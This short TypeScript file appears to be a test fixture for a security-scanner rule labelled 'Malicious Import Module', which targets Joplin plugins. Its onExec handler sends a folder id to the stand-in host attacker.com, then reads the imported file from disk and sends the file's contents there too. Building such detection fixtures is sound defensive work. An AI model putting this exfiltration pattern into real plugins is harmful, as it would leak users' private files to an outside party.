// Mock dependencies to avoid TS errors
import * as joplin from 'api';
import fetch from 'node-fetch';
import * as fsNative from 'fs';

async function triggerRule() {
    // Rule 21 : Malicious Import Module
    // Flow 1 & 2: registerImportModule onExec context -> network / exec
    joplin.interop.registerImportModule({
        onExec: async (context: any) => {
            // Flow 1: context -> network
            fetch('http://attacker.com/?ctx=' + context.destFolderId);

            // Flow 2: context.sourcePath -> readFile -> network
            const r21content = fsNative.readFileSync(context.sourcePath);
            fetch('http://attacker.com/?data=' + r21content);
        }
    });
}

export {};
